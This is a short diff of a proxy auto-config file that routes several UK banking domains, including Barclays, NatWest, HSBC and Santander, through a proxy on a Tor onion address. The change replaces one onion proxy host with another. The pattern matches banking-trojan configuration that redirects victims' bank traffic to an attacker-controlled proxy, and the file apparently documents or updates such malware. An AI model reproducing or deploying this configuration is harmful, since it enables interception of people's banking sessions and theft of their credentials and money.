@@ -1,5 +1,5 @@
 function FindProxyForURL(url, host) {
-    var proxy = "PROXY 7tnrj5wewhcj76c3.onion:88;";
+    var proxy = "PROXY log5moxngjoys52g.onion:88;";
     var hosts = new Array('*barclays.co.uk', '*natwest.com', '*nwolb.com',
         'hsbc.co.uk', 'www.hsbc.co.uk', '*business.hsbc.co.uk',
         '*santander.co.uk', '*rbsdigital.com',
